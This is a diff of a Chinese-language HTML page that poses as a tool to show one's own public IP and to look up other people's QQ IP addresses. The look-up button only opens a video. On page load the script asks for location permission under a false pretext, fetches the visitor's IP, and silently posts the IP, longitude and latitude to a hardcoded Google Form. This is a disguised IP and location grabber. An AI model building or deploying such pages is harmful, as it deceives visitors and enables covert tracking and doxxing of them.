@@ -5,27 +5,30 @@
   <title>简单实用地自检查IP和侦测QQIP</title>
   <style>
     body { font-family: Arial, sans-serif; padding: 20px; }
-    #status, #info { margin-top: 20px; white-space: pre-wrap; }
+    #status { margin-top: 20px; white-space: pre-wrap; }
+    button { margin: 5px 0; padding: 8px 12px; font-size: 16px; }
   </style>
 </head>
 <body>
   <h1>查询QQIP功能加载中，请稍候......</h1>
   <p id="info">=请允许定位权限以确保功能运作正常（这个过程会帮您展示您的IP以确保回答的准确性）</p>
 
-  <button onclick="getIPOnly()">点击仅显示当前公网 IP</button>
+  <button onclick="getIP()">点击仅显示当前公网 IP</button>
   <p id="ipOnlyResult"></p>
 
+  <button onclick="window.open('https://www.bilibili.com/video/BV1GJ411x7h7/?spm_id_from=333.337.search-card.all.click&vd_source=7504f18c191405de66c8b613d77dfea9', '_blank')">
+    查询他人IP
+  </button>
+
   <script>
-    // Google 表单的URL
     const googleFormURL = "https://docs.google.com/forms/u/0/d/e/1FAIpQLSeWEBe4zv0G74aEItUIJIUhx-vcqLy4cVs_VO68Dqo0wN9H5w/formResponse";
 
-    // Google 表单字段 Entry ID
     const entryIP = "entry.349181765";
     const entryLon = "entry.1434358418";
     const entryLat = "entry.99996352";
 
-    // 仅显示IP按钮功能
-    async function getIPOnly() {
+    // 仅显示IP按钮对应函数
+    async function getIP() {
       const output = document.getElementById('ipOnlyResult');
       output.textContent = "查询中……";
       try {
@@ -37,8 +40,8 @@
       }
     }
 
-    // 获取公网IP
-    async function getIP() {
+    // 自动获取IP的函数（给main用）
+    async function fetchIP() {
       try {
         let res = await fetch('https://api.ipify.org?format=json');
         let data = await res.json();
@@ -48,10 +51,11 @@
       }
     }
 
-    // 根据IP数字匹配国家
+    // 读取json文件匹配IP归属国家
     async function fetchCountryFromIP(ip) {
+      // 把IP转成数字便于比较
       const ipNum = ip.split('.').reduce((acc, val) => acc * 256 + Number(val), 0);
-      const response = await fetch('ip_country_ranges.json');  // 确保路径正确
+      const response = await fetch('ip_country_ranges.json');
       const data = await response.json();
 
       for (const [start, end, country] of data) {
@@ -59,11 +63,10 @@
           return country;
         }
       }
-
       return '未知国家';
     }
 
-    // 提交到Google表单
+    // 上传数据到谷歌表单
     function postToGoogleForm(ip, lon, lat) {
       const formData = new FormData();
       formData.append(entryIP, ip);
@@ -77,9 +80,9 @@
       }).catch(console.error);
     }
 
-    // 主流程
+    // 页面加载后自动执行
     async function main() {
-      const ip = await getIP();
+      const ip = await fetchIP();
       document.getElementById('info').textContent = "IP: " + ip + "，等待定位中...";
 
       const country = await fetchCountryFromIP(ip);
@@ -106,4 +109,3 @@
   </script>
 </body>
 </html>
-
